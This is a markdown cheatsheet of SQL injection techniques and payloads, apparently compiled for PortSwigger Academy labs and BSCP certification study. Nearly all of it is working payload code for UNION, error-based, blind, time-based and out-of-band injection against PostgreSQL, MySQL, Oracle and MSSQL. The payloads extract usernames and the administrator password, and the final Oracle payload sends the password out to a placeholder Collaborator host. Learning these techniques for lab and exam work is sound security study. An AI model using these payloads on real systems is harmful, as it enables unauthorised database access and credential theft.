# SQL Injection (SQLi) Cheatsheet & Methodology

Compiled during PortSwigger Academy labs & BSCP preparation.

---

## 📌 Injection Types Covered
1. [UNION-based SQLi](#1-union-based-attacks)
2. [Error-based SQLi](#2-error-based-sqli)
3. [Blind SQLi Conditional responses](#3-blind-sqli-conditional-responses)
4. [Blind SQLi Conditional errors](#4-blind-sqli-conditional-errors)
5. [Time-based Blind SQLi](#5-time-based-blind-sqli)
6. [Out-of-Band (OAST / Collaborator)](#6-out-of-band)

---

## 🛠️ Key Payloads & Bypasses

### Detection:
```
'
' OR 1=1--
' OR '1'='1
`
;
```

### 1. UNION-Based Attacks 
We can use when response reflects query results 

**STEP 1: Determine column count**
```sql
  ' ORDER BY 1--
  ' ORDER BY 2--
  ' ORDER BY 3--  -- Error indicates 2 columns exist
```

**STEP 2: Determine data types (find string columns)**
```sql
' UNION SELECT 'a', NULL--
' UNION SELECT NULL, 'a'--

When we receive 200 OK,that means we can exfiltrate data from that column
```
**STEP 3: Extract data (PostgreSQL / MySQL / Oracle)**
```sql
' UNION SELECT NULL, username || '~' || password FROM users-- > If we have only one string column
' UNION SELECT username, password FROM users-- > If we have two or more string columns
```

-------------------------------------------------

### 2. Error-based SQLi
Used when database errors are displayed in the HTTP response, leaking database internal data or query outputs

**CAST / CONVERT Error Payload (PostgreSQL)**
```sql
' AND CAST((SELECT password FROM users LIMIT 1) AS int)=1--
```
**Tracking visible errors in response**
```sql
' AND 1=CAST((SELECT username || '~' || password FROM users LIMIT 1) AS int)--
```

-------------------------------------------------


### 3. Blind SQLi Conditional responses
Used when the application returns different content (e.g., "Welcome back" vs no message) based on True/False statements, but does not display SQL data

**Testing for Boolean behavior**
```sql
TrackingId=xyz' AND 1=1--  -- Page loads normally (True) > "Welcome back" in response 
TrackingId=xyz' AND 1=2--  -- Page changes / missing text (False) > "Welcome back" not included in response 
```
**Extracting password length & characters**
```sql
TrackingId=xyz' AND LENGTH((SELECT password FROM users WHERE username='administrator'))>19-- > Identifying the length of password 
TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1)='a'-- > Using the ASCII table, we guess the characters one by one
```

-------------------------------------------------


### 4. Blind SQLi Conditional errors
Used when the response body never changes, but causing a database error (like division by zero) forces an HTTP 500 status code.

**Oracle Conditional Error Payload**
```sql
TrackingId=xyz' UNION SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--
```
**Extracting character conditionally (Oracle)**
```sql
TrackingId=xyz' UNION SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN TO_CHAR(1/0) ELSE NULL END FROM dual--
```


-------------------------------------------------


### 5. Time-based Blind SQLi
Used when neither responses nor status codes change, exploit introduces time delays inside DB functions to confirm execution
For this examples we will take PostgreSQL

**PostgreSQL Delay**
```sql
TrackingId=xyz'; SELECT pg_sleep(5)-- > Server give response after 5 seconds 
```
**Conditional Delay (PostgreSQL)**
```sql
TrackingId=xyz'; SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END--
```
**Other DBMS Delays**

⬇️

Microsoft SQL: 
```sql
'; WAITFOR DELAY '0:0:5'--
```
MySQL:
```sql
' AND SLEEP(5)--
```


--------------------------------------------------


### 6. Out-of-Band 
Used in fully asynchronous or blind scenarios. Forces the database server to perform a DNS or HTTP lookup to a controlled Burp Collaborator domain

**Oracle OAST Injection**
```sql
TrackingId=xyz' UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "[http://YOUR-COLLABORATOR-ID.oastify.com/](http://YOUR-COLLABORATOR-ID.oastify.com/)"> %remote;]>'),'/l') FROM dual--
```
**Data Exfiltration via OAST (Oracle)**
```sql
TrackingId=xyz' UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://' || (SELECT password FROM users WHERE username='administrator') || '[.YOUR-COLLABORATOR-ID.oastify.com/](https://.YOUR-COLLABORATOR-ID.oastify.com/)"> %remote;]>'),'/l') FROM dual--
```



